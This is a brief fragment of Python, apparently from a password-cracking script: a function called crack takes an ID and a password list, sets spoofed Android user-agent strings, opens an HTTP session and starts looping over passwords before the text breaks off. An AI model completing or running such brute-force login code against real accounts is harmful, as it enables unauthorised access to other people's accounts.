...
def crack(idf,pwv):
	...
	ua ='Mozilla/5.0 (Linux; U; Android 9; en-gb; RMX1925 Build/PKQ1.190616.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36'
	ua2 ='Mozilla/5.0 (Linux; U; Android 9; en-gb; RMX1925 Build/PKQ1.190616.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36'
	ses = requests.Session()
	for pw in pwv:
		try:
